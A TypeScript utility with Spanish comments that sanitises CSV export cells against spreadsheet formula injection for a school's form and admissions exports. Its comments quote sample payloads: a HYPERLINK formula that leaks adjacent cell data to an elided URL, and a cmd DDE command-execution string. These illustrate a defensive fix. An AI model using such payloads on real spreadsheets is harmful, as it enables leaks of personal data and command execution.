/**
 * Una celda de CSV, escapada y sin fórmulas.
 *
 * Las dos exportaciones del panel —respuestas de formularios y admisiones—
 * tenían cada una su propia función de escape, y ninguna de las dos hacía lo
 * que de verdad hace falta aquí.
 *
 * ## Por qué escapar no basta
 *
 * Escapar comas y comillas produce un CSV **correcto**. El problema no es el
 * formato: es que Excel, Numbers y Google Sheets tratan como **fórmula** toda
 * celda que empiece por `=`, `+`, `-` o `@`.
 *
 * Y el contenido viene de fuera. Cualquiera rellena un formulario público del
 * sitio con `=HYPERLINK("http://…?"&A1,"Ver")` en un campo de texto, sin
 * cuenta y sin permisos. Secretaría exporta las respuestas, abre el archivo, y
 * la fórmula se evalúa con los datos personales de la hoja al lado. Lo único
 * que hace falta es que alguien del colegio pulse el botón que existe
 * justamente para eso.
 *
 * ## Qué hace
 *
 * Antepone una comilla simple, que es la marca de «esto es texto» de las hojas
 * de cálculo, para que la celda no se evalúe.
 *
 * ## Lo que cuesta, y no está medido
 *
 * **No sabemos si la comilla se ve.** Al escribir en una celda es invisible;
 * al ABRIR un CSV, hay programas que la muestran literal. Nadie lo ha
 * comprobado todavía en Excel de Windows, Numbers ni Google Sheets, así que
 * hay que contar con que los teléfonos salgan como `'+593987654321`.
 *
 * Afecta a todo lo que empiece por `+` o `-`: teléfonos ecuatorianos con
 * prefijo, y los números negativos de un campo numérico con mínimo bajo cero
 * —que el constructor de formularios permite—, que además dejan de sumarse
 * como números. Se acepta porque **un CSV feo se nota y una fórmula ejecutada
 * no**, pero es una decisión, no un efecto secundario que nadie vio venir.
 *
 * ## Lo que esto NO cubre
 *
 * Protege el archivo, no el dato. Si alguien copia una celda del CSV abierto y
 * la pega en otra hoja, se pega la fórmula y **sí se evalúa**. Igual si
 * selecciona la tabla de respuestas en pantalla o en el correo interno y la
 * pega en Excel: eso no pasa por aquí.
 *
 * ⚠️ Y si algún día algo del proyecto **vuelve a leer** estos CSV, la comilla
 * llega como carácter literal y hay que quitarla. Hoy no hay ningún lector.
 */

/**
 * Los cuatro caracteres con los que empieza una fórmula.
 *
 * `=` y `@` no tienen uso legítimo al principio de una respuesta y se
 * neutralizan siempre. `+` y `-` sí lo tienen —los teléfonos y los números
 * negativos— y pasan además por `ES_NUMERO_INOFENSIVO`.
 */
const ABRE_FORMULA = /^[=+\-@]/;

/**
 * Un `+` o un `-` seguidos SOLO de número no ejecutan nada.
 *
 * ## Por qué existe esta excepción
 *
 * Comprobado el 2026-09-02 abriendo el archivo en Excel: la comilla **se ve**.
 * Y el placeholder del teléfono en el formulario público es `+593 9__ ___ ____`,
 * o sea que el propio sitio enseña a la familia a escribirlo empezando por `+`.
 * Sin esta excepción, casi todas las filas de la columna Teléfono salían como
 * `'+593987654321` — y los negativos de un campo numérico, como `'-5`.
 *
 * ## Por qué es seguro
 *
 * Lo peligroso de una fórmula no es el signo: son las FUNCIONES y las
 * REFERENCIAS, y las dos necesitan letras. `+HYPERLINK(…)`, `-1+A1`,
 * `+cmd|'/c calc'!A0` llevan letras y siguen neutralizándose. Lo que se deja
 * pasar es aritmética pura, que como mucho se evalúa a un número.
 *
 * ## El precio, dicho claro
 *
 * `+1+1` deja de neutralizarse y Excel lo mostrará como `2`. Es una corrupción
 * del dato, no una ejecución: no abre nada, no llama a nadie, no filtra la hoja
 * de al lado. Se acepta a cambio de que los teléfonos de todas las familias se
 * lean como teléfonos. Escribir eso en un campo de teléfono, además, hay que
 * proponérselo.
 *
 * ⚠️ Si algún día se amplía esta expresión, que sea a más puntuación numérica y
 * **nunca a letras**: la primera letra que se cuele aquí reabre el agujero
 * entero que `celdaCsv` existe para tapar.
 */
const ES_NUMERO_INOFENSIVO = /^[+-][\d\s().,+\-/]*$/;

/**
 * Lo que hay que descontar antes de mirar si abre fórmula.
 *
 * Mirar solo el carácter de la posición cero **no basta**, y es un agujero de
 * coste cero: basta con teclear un espacio delante. `␣=HYPERLINK(…)` pasaría
 * sin tocar, y los importadores que recortan el blanco inicial —Google Sheets
 * al importar, LibreOffice con «recortar espacios»— se quedan con la fórmula
 * viva. Excel abriendo el `.csv` directo sí la deja como texto, así que el
 * hueco era parcial; parcial es suficiente.
 *
 * Van también el espacio duro, el BOM y los caracteres de control, que no se
 * ven al leer una respuesta en pantalla.
 *
 * ⚠️ **Esta lista es un contrato, no un adorno.** El proyecto no tiene runner
 * de pruebas, así que estos ocho casos son lo único que la sostiene. Si alguien
 * simplifica la expresión por barroca, todos vuelven a pasar y nada avisa:
 *
 *   1. espacio delante          5. nulo (U+0000) delante
 *   2. espacio duro (U+00A0)    6. BOM (U+FEFF) delante
 *   3. tabulacion vertical      7. varios espacios seguidos
 *   4. avance de pagina         8. espacio + el ataque real de la ficha
 *
 * Los ocho pasaban antes del 2026-08-19 y ninguno cuesta más que teclear un
 * espacio.
 */
const INVISIBLE_INICIAL = /^[\s\u0000-\u001F\u00A0\uFEFF]+/;

/**
 * Y los que arrancan con un invisible, se neutralizan igual aunque después no
 * venga fórmula: un tabulador o un salto delante son formas conocidas de colar
 * contenido en la celda de al lado, y en un nombre o un comentario no pintan
 * nada.
 */
const ARRANCA_INVISIBLE = /^[\t\r\n]/;

/**
 * Acepta `number` además de `string`: en las exportaciones hay columnas que son
 * enteros en la base —`numero` de solicitud, `anio_ingreso`— y antes llegaban
 * aquí solo porque el tipo lo inferíaSupabase. Al declarar los tipos a mano
 * para paginar, salió a la luz. El cuerpo ya hacía `String(valor)`, así que
 * esto documenta lo que la función siempre hizo, no la cambia.
 */
export function celdaCsv(valor: string | number | null | undefined): string {
  let s = String(valor ?? "");

  // Se mira el valor sin sus invisibles de delante, pero la comilla se antepone
  // al valor ENTERO: recortarlo cambiaría el dato que el colegio ve.
  const desnudo = s.replace(INVISIBLE_INICIAL, "");

  // Un `+593 987 654 321` o un `-5` abren fórmula pero no ejecutan nada, y
  // llevar comilla los ensuciaba en todas las filas. Ver ES_NUMERO_INOFENSIVO.
  const abreFormula =
    ABRE_FORMULA.test(desnudo) && !ES_NUMERO_INOFENSIVO.test(desnudo);

  // Primero neutralizar, después escapar: al revés, la comilla simple acabaría
  // dentro de las comillas dobles y se vería en la celda.
  if (abreFormula || ARRANCA_INVISIBLE.test(s)) s = `'${s}`;

  if (/[",\n\r]/.test(s)) s = `"${s.replace(/"/g, '""')}"`;

  return s;
}

/**
 * El BOM que Excel en Windows necesita para leer el archivo como UTF-8.
 *
 * Sin él, «Cómo se enteró» o «Año escolar» llegan con la codificación rota.
 * Va aparte y con nombre para que la próxima exportación no se olvide: la de
 * admisiones lo estuvo sin durante meses mientras la de formularios sí lo
 * ponía, y la diferencia no se ve hasta que alguien abre el archivo en un
 * Windows.
 */
export const BOM_UTF8 = "﻿";
